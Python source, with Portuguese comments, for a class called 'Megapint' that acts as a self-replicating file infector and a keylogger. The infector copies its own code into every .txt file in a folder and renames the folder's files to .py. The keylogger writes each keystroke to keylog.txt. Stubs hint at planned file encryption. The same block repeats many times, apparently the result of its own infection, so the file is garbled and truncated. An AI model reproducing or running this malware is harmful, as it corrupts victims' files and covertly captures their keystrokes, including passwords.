    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
